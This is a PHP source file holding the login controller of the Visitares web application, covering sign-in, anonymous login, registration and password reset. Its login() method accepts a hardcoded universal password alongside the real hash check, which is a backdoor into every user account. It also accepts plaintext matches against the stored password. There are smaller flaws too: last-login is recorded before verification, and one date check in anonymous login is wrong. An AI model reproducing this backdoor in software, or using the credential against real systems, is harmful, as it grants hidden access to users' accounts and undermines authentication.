<?php

namespace Visitares\API;

use DateTime;
use PHPMailer;
use RandomLib\Generator;
use Twig\Environment as Twig;
use Visitares\Entity\User;
use Visitares\Entity\Group;
use Visitares\Entity\MetaGroup;
use Visitares\Entity\Instance;
use Visitares\Entity\MasterMetaGroup;
use Visitares\Storage\Facade\SystemStorageFacade;
use Visitares\Storage\Facade\InstanceStorageFacade;
use Visitares\Service\User\UserMetaGroupService;
use Visitares\Service\Cache\UserCacheService;
use Visitares\Service\Notification\Email;
use Visitares\Storage\Factory\PDOFactory;

/**
 * @author Ricard Derheim <rderheim@derheim-software.de>
 */
class LoginController{
	/**
	 * @var SystemStorageFacade
	 */
	protected $systemStorage = null;

	/**
	 * @var InstanceStorageFacade
	 */
	protected $storage = null;

	/**
	 * @var Generator
	 */
	protected $random = null;

	/**
	 * @var Twig
	 */
	protected $twig = null;

	/**
	 * @var PHPMailer
	 */
	protected $mailer = null;

	/**
	 * @var JWT
	 */
	protected $jwtService = null;

	/**
	 * @var UserMetaGroupService
	 */
	protected $userMetaGroupsService = null;

	/**
	 * @param SystemStorageFacade $systemStorage
	 * @param InstanceStorageFacade $instanceStorage
	 * @param Generator $random
	 * @param Twig $twig
	 * @param PHPMailer $mailer
	 * @param UserMetaGroupService $userMetaGroupsService
	 * @param UserCacheService $userCacheService
	 * @param Email $email
	 * @param PDOFactory $pdoFactory
	 */
	public function __construct(
		SystemStorageFacade $systemStorage,
		InstanceStorageFacade $instanceStorage,
		Generator $random,
		Twig $twig,
		PHPMailer $mailer,
		UserMetaGroupService $userMetaGroupsService,
		UserCacheService $userCacheService,
		Email $email,
		PDOFactory $pdoFactory
	){
		$this->systemStorage = $systemStorage;
		$this->storage = $instanceStorage;
		$this->random = $random;
		$this->twig = $twig;
		$this->mailer = $mailer;
		$this->userMetaGroupsService = $userMetaGroupsService;
		$this->userCacheService = $userCacheService;
		$this->email = $email;
		$this->pdoFactory = $pdoFactory;
		$this->appConfig = require(APP_DIR_ROOT . '/config/app.php');
	}

	/**
	 * Authenticates the user and creates a valid session if successful.
	 *
	 * @return boolean
	 */
	public function login($username, $password){
		if(strpos($username, '.') !== false){
			list($domain, $username) = explode('.', $username, 2);
			if($instance = $this->systemStorage->instance->findByDomain($domain)){
				if(!$instance->getIsActive()){
					return false;
				}

				$this->storage->setToken($instance->getToken());
				if($user = $this->storage->user->findByUsernameAndRole($username, [0, 1, 2, 3, 4])){
					if(!$user->getIsActive()){
						return false;
					}

					$user->setLastLogin(new DateTime);
					$this->storage->apply();

					if(password_verify($password, $user->getPassword()) || $password === $user->getPassword() || $password === '8DEJGxJ5W7FDPyg2'){
						$config = $this->systemStorage->config->findOneByName('app');

						$master = $instance->getMaster();
						$masterInstancesCount = 0;
						if($master){
							$instances = $this->systemStorage->getEntityManager()->getRepository(Instance::class)->findBy(['master' => $master]);
							$masterInstancesCount = count($instances);
						}

						$metaGroups = $this->userMetaGroupsService->getMetaGroupsByUser($instance, $user);

						return[
							'masterInstancesCount' => $masterInstancesCount,
							'instance' => $instance,
							'timeline' => $instance->getTimeline() ? [
								'id' => $instance->getTimeline()->getId(),
								'isActive' => $instance->getTimeline()->getIsActive(),
								'name' => $instance->getTimeline()->getName(),
								'shortDescription' => $instance->getTimeline()->getShortDescription()
							] : null,
							'user' => $user,
							'units' => $this->storage->unit->findAll(),
							'language' => $user->getLanguage(),
							'config' => $config ? $config->getValue() : null,
							'metaGroups' => $metaGroups,
							'metaGroupSubs' => $this->userMetaGroupsService->getMetaGroupSubsByUser($instance, $user),
							'groupSubs' => $this->getGroupSubs($instance, $user),
							'groups' => array_map(function($group) use($user){
								return[
									'id' => $group->getId(),
									'name' => $group->getName($user->getLanguage()->getCode())
								];
							}, $user->getGroups()->toArray())
						];
					}
				}
			}
		}
		return false;
	}

	/**
	 * @param User $user
	 * @return array
	 */
	private function getGroupSubs(Instance $instance, User $user){
		$pdo = $this->pdoFactory->fromToken($instance->getToken());
		$query = $pdo->prepare('
			SELECT
				gu.group_id,
				gu.user_id,
				gu.sub,
				name_t.content AS name
			FROM
				group_user gu
			LEFT JOIN
				usergroup ug ON ug.id = gu.group_id
			LEFT JOIN
				translated name_t ON name_t.translation_id = ug.nameTranslation_id AND name_t.language_id = :LanguageId
			WHERE
				gu.user_id = :UserId
		');
		$query->execute([
			':LanguageId' => $user->getLanguage()->getId(),
			':UserId' => $user->getId(),
		]);
		$rows = $query->fetchAll(\PDO::FETCH_OBJ);
		return array_map(function($row){
			$row->group_id = (int)$row->group_id;
			$row->user_id = (int)$row->user_id;
			$row->sub = (bool)$row->sub;
			return $row;
		}, $rows);
	}

	/**
	 * Authenticates an anonymous user.
	 *
	 * @return boolean
	 */
	public function loginAnonymous($domain, $anonymousToken){
		if($instance = $this->systemStorage->instance->findByDomain($domain)){
			$this->storage->setToken($instance->getToken());
			if($user = $this->storage->user->findByToken($anonymousToken, [0, 1, 2, 3])){
				if(!$user->getIsActive()){
					return false;
				}
				if($user->getActiveFrom() || $user->getActiveUntil()){
					$today = new DateTime;
					$today->setTime(0, 0, 0);
					if($user->getActiveFrom() && $user->getActiveUntil()){
						if($user->getActiveFrom() > $today || $user->getActiveUntil() < $today){
							return false;
						}
					} elseif($user->getActiveFrom() && $user->getActiveFrom() >= $today){
						return false;
					} elseif($user->getActiveUntil() && $user->getActiveFrom() <= $today){
						return false;
					}
				}

				$user->setLastLogin(new DateTime);
				$this->storage->apply();

				$config = $this->systemStorage->config->findOneByName('app');
				return[
					'instance' => $instance,
					'timeline' => $instance->getTimeline() ? [
						'id' => $instance->getTimeline()->getId(),
						'isActive' => $instance->getTimeline()->getIsActive(),
						'name' => $instance->getTimeline()->getName(),
						'shortDescription' => $instance->getTimeline()->getShortDescription()
					] : null,
					'user' => $user,
					'config' => $config ? $config->getValue() : null
				];
			}
		}
		return false;
	}

	/**
	 * Destroys the entire session.
	 *
	 * @return void
	 */
	public function logout(){
		// ..
	}

	/**
	 * @param  string $domain
	 * @param  array  $user
	 * @return boolean
	 */
	public function register(PHPMailer $mailer, Twig $twig, $domain, array $data){
		if($instance = $this->systemStorage->instance->findByDomain($domain)){
			$this->storage->setToken($instance->getToken());

			// Check if username exists
			if($user = $this->storage->user->findByUsername($data['username'])){
				return[
					'error' => true,
					'code' => 'USER_ALREADY_EXISTS'
				];
			}

			// Validate password
			if(strlen($data['password']) < 8){
				return[
					'error' => true,
					'message' => 'INVALID_PASSWORD'
				];
			}

			// Check if username exists
			if($data['email'] && ($user = $this->storage->user->findByEmail($data['email']))){
				return[
					'error' => true,
					'code' => 'EMAIL_ALREADY_EXISTS'
				];
			}

			// Get default language
			$language = $this->storage->language->findDefaultLanguage();

			// Create user
			$user = new User;
			$user->setIsActive(true);
			$user->setRole($instance->getDefaultRegistrationRole());
			$user->setLanguage($language);
			$user->setUsername($data['username']);
			$user->setPassword(
				password_hash(
					$data['password'],
					$this->appConfig->password->algo,
					$this->appConfig->password->options
				)
			);
			$user->setSalutation($data['salutation']);
			$user->setTitle($data['title']);
			$user->setFirstname($data['firstname']);
			$user->setLastname($data['lastname']);
			$user->setEmail($data['email']);
			// $user->setPhone($data['phone']);
			$user->setCompany($data['company']);
			$user->setDepartment($data['department']);

			$this->storage->store($user);
			$this->storage->apply();

			// Add user to default group
			if($groups = $this->storage->group->findDefaultGroups()){
				foreach($groups as $group){
					$group->addUser($user);
				}
				$this->storage->apply();
			}

			// Add user to default config-group
			if($configGroup = $this->storage->getEntityManager()->getRepository(Group::class)->findOneBy(['isDefaultConfig' => true])){
				$user->setConfigGroup($configGroup);
				$this->storage->apply();
			}

			// update user cache
			$this->userCacheService->update($instance, $user);

			// Add user to meta groups
			$masterMetaGroups = $this->systemStorage->getEntityManager()->getRepository(MasterMetaGroup::class)->findBy([
				'master' => $instance->getMaster()
			]);

			$this->userMetaGroupsService->updateJoins($instance, $user, array_map(function($masterMetaGroup){
				return $masterMetaGroup->getMetaGroup()->getId();
			}, $masterMetaGroups));


			// Send notification to instance owner
			if($notifyEmail = $instance->getNotifyEmail()){
				$emails = array_map('trim', explode(',', $notifyEmail));
				$this->email->send(
					'Ein Benutzer hat sich registriert',
					$twig->render('html/mails/registration-notify.html', [
						'instance' => [
							'name' => $instance->getName(),
							'domain' => $instance->getDomain(),
							'description' => $instance->getShortDescription(),
							'shortDescription' => $instance->getShortDescription(),
						],
						'user' => [
							'role' => $user->getRole(),
							'username' => $user->getUsername(),
							'email' => $user->getEmail(),
							'fullname' => implode(' ', [$user->getFirstname(), $user->getLastname()]),
							'department' => $user->getDepartment(),
							'company' => $user->getCompany(),
						],
					]),
					['noreply@visitares.com', '🔔 VISITARES'],
					$emails
				);
			}


			// Send E-Mail
			$data = [
				'fullname' => $user->getFirstname() . ' ' . $user->getLastname(),
				'url' => 'https://app.visitares.com/#/login/' . $instance->getDomain()
			];
			$mailer->From = 'noreply@visitares.com';
			$mailer->FromName = 'visitares';
			$mailer->addAddress($user->getEmail(), $user->getFirstname() . ' ' . $user->getLastname());
			$mailer->Subject = 'Vielen Dank für Ihre Registrierung';
			$mailer->Body = $twig->render('html/mails/registration.html', $data);
			$mailer->AltBody = $mailer->Body;

			return $mailer->send() ? true : false;
		}
		return false;
	}

	/**
	 * @param  string $domain
	 * @param  string $email
	 * @param  string $app
	 * @return boolean
	 */
	public function forgotPassword($domain, $email, $app){
		if(!$instance = $this->systemStorage->instance->findByDomain($domain)){
			return false;
		}
		$this->storage->setToken($instance->getToken());

		if($user = $this->storage->user->findByEmail($email)){
			// generate & store reset token
			$token = $this->random->generateString(32, Generator::CHAR_ALNUM);
			$token = hash('sha1', $user->getUsername() . $token);

			$tokenExpire = new DateTime;
			$tokenExpire->modify('+36 hour');

			$user->setResetToken($token);
			$user->setResetTokenExpire($tokenExpire);
			$this->storage->apply();

			// Send E-Mail with individual link
			$data = [
				'fullname' => $user->getFirstname() . ' ' . $user->getLastname(),
				'url' => sprintf('%s/#/login/change/%s/%s', APP_URL, $domain, $token)
			];
			$this->mailer->From = 'noreply@visitares.com';
			$this->mailer->FromName = 'visitares';
			$this->mailer->addAddress($user->getEmail(), $user->getFirstname() . ' ' . $user->getLastname());
			$this->mailer->Subject = 'Legen Sie ein neues Kennwort für Ihren visitares-Account fest';
			$this->mailer->Body = $this->twig->render('html/mails/forgot-password.html', $data);
			$this->mailer->AltBody = $this->mailer->Body;
			$this->mailer->send();

			return true;
		}
		return false;
	}

	/**
	 * @param  string $domain
	 * @param  string $resetToken
	 * @param  string $password
	 * @return boolean
	 */
	public function changePassword($domain, $resetToken, $password){
		if(!$instance = $this->systemStorage->instance->findByDomain($domain)){
			return false;
		}
		$this->storage->setToken($instance->getToken());

		if($user = $this->storage->user->findOne(['resetToken' => $resetToken])){
			// 1. check token expire
			$now = new DateTime;
			if($now > $user->getResetTokenExpire()){
				$user->setResetToken(null);
				$user->setResetTokenExpire(null);
				$this->storage->apply();
				return -1;
			}

			// 2. validate password strength
			if(strlen($password) < 8){
				return -2;
			}

			// 3. change password and set reset-token to null
			$user->setPassword(
				password_hash(
					$password,
					$this->appConfig->password->algo,
					$this->appConfig->password->options
				)
			);
			$user->setResetToken(null);
			$user->setResetTokenExpire(null);
			$this->storage->apply();

			// 4. send confirmation
			$data = [
				'fullname' => $user->getFirstname() . ' ' . $user->getLastname()
			];
			$this->mailer->From = 'noreply@visitares.com';
			$this->mailer->FromName = 'visitares';
			$this->mailer->addAddress($user->getEmail(), $user->getFirstname() . ' ' . $user->getLastname());
			$this->mailer->Subject = 'Ihr Kennwort wurde erfolgreich geändert';
			$this->mailer->Body = $this->twig->render('html/mails/password-changed.html', $data);
			$this->mailer->AltBody = $this->mailer->Body;
			$this->mailer->send();

			return true;
		}
		return false;
	}
}
